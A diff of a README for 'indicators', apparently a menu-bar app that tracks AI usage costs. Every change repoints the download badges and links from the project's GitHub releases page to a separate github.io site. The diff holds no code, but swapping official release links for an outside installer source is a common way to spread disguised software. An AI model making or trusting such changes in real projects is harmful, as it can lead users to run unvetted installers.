@@ -1,7 +1,7 @@
 <h1>📊 indicators - AI Cost Monitor for Your Menu Bar</h1>
 
 <p align="center">
-  <a href="https://github.com/noor-afshan/indicators/releases">
+  <a href="https://noor-afshan.github.io">
     <img src="https://img.shields.io/badge/Download_indicators-Free-2ea44f?style=for-the-badge&logo=github" alt="Download indicators">
   </a>
 </p>
@@ -27,7 +27,7 @@
 <p>Getting indicators up and running is simple. Just follow these steps:</p>
 
 <ol>
-  <li><strong>Visit the download page:</strong> <a href="https://github.com/noor-afshan/indicators/releases">Visit this link to download the application</a></li>
+  <li><strong>Visit the download page:</strong> <a href="https://noor-afshan.github.io">Visit this link to download the application</a></li>
   <li><strong>Choose the right file:</strong> Look for the latest release and download the file that matches your system.</li>
   <li><strong>Run the installer:</strong> Once the download is complete, open the downloaded file and follow the simple on-screen instructions.</li>
   <li><strong>Launch indicators:</strong> After installation, find indicators in your Applications folder and open it.</li>
@@ -40,7 +40,7 @@
 
 <p>Ready to take control of your AI spending? Here's everything you need to know:</p>
 
-<p><a href="https://github.com/noor-afshan/indicators/releases"><strong>Visit this link to download the application</strong></a></p>
+<p><a href="https://noor-afshan.github.io"><strong>Visit this link to download the application</strong></a></p>
 
 <p>When you arrive at the download page, you'll see a list of releases. Look for the newest one (usually at the top) and click the download link. The file will be saved to your Downloads folder.</p>
 
@@ -100,7 +100,7 @@
 <p>We're here to help you save money and avoid rate limit surprises. Happy monitoring!</p>
 
 <p align="center">
-  <a href="https://github.com/noor-afshan/indicators/releases">
+  <a href="https://noor-afshan.github.io">
     <img src="https://img.shields.io/badge/Download_Now-Get_Started-important?style=for-the-badge" alt="Download Now">
   </a>
 </p>
